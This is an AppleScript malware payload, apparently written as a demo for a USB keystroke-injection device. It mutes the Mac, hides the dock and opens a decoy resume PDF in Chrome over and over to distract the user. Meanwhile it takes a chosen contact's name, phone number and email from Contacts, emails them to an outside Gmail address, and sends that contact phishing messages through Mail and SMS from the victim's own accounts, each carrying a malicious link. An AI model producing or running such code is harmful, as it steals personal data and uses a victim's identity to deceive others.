-- This script finds the name of a specified Contact and emails their name, number and email to us.
-- Then it emails the Contact from the User's Email with a malicious link

-- Mutes the Device
set volume output volume 0

-- Hides the dock to prevent user from seeing what is happening
tell application "System Events"
	set autohide of dock preferences to true
end tell

-- A function that checks if an application is running
on isApplicationRunning(appName)
	tell application "System Events"
		set runningApps to every application process whose name is appName
		return (count of runningApps) is not 0
	end tell
end isApplicationRunning

-- Distracts user with fake pdf application
tell application "Google Chrome"
	launch
end tell

-- Reopens the window multiple times
set counter to 0
repeat
	if (isApplicationRunning("Google Chrome")) then
		tell application "Google Chrome"
			launch
			make new window
			open location "https://myfuture.edu.au/docs/default-source/entry-level-resumes/resume_sample_student8ea47e04a8fe67e6b7acff0000376a3b.pdf?sfvrsn=c43a27d9_6"
		end tell
		set counter to counter + 1
		
		-- Would probably set this to 10-20. It has been reduced for the sake the demo
		if counter is 3 then
			exit repeat
		end if
		delay 1
	end if
end repeat

-- Steals contact info of a specified Contact
set wantedContact to "Fake Contact"
tell application "Contacts"
	set foundContacts to every person whose name is wantedContact
	if (count of foundContacts) is greater than 0 then
		set contact to item 1 of foundContacts
		set phoneNumbers to value of phone 1 of contact
		set contactEmail to value of email of contact
		set details to "Name: " & wantedContact & ", Phone Number: " & phoneNumbers & ", Email: " & contactEmail
	else
		set details to "Contact Not Found"
	end if
	quit
end tell

-- Got the structure of how to send an email using apple scripts from this query: https://gist.github.com/youandhubris/9e292822e3db8f91df93234db092906e
if details is not "Contact Not Found" then
	tell application "Mail"
		-- email contact details to myself
		set theTo to "rubberducky.kk@gmail.com"
		set theSubject to "Got their contact List!"
		set theMessage to make new outgoing message with properties {subject:theSubject, content:details, visible:true}
		tell theMessage
			make new recipient at end of to recipients with properties {address:theTo}
		end tell
		send theMessage
		
		-- email contact from user's email
		set theTo to contactEmail
		set theSubject to "Quick Task"
		set maliciousContent to "Hey " & wantedContact & "," & return & "Just quickly wanted to ask if you could vote for me for this competition I entered at work. Here's the link: https://www.clearnetwork.com/malicious-urls/"
		set theMessage to make new outgoing message with properties {subject:theSubject, content:maliciousContent, visible:true}
		tell theMessage
			make new recipient at end of to recipients with properties {address:theTo}
		end tell
		send theMessage
		
		delay 1
		quit
	end tell
	
	-- used code structure from https://developer.apple.com/forums/thread/668567
	tell application "Messages"
		set targetService to 1st account whose service type = SMS
		set targetBuddy to participant phoneNumbers of targetService
		send "Hey, just quickly wanted to ask if you could vote for me for this competition I entered at work. Here's the link: https://www.clearnetwork.com/malicious-urls/" to targetBuddy
		delay 1
		quit
	end tell
end if


-- brings dock back
tell application "System Events"
	set autohide of dock preferences to false
end tell
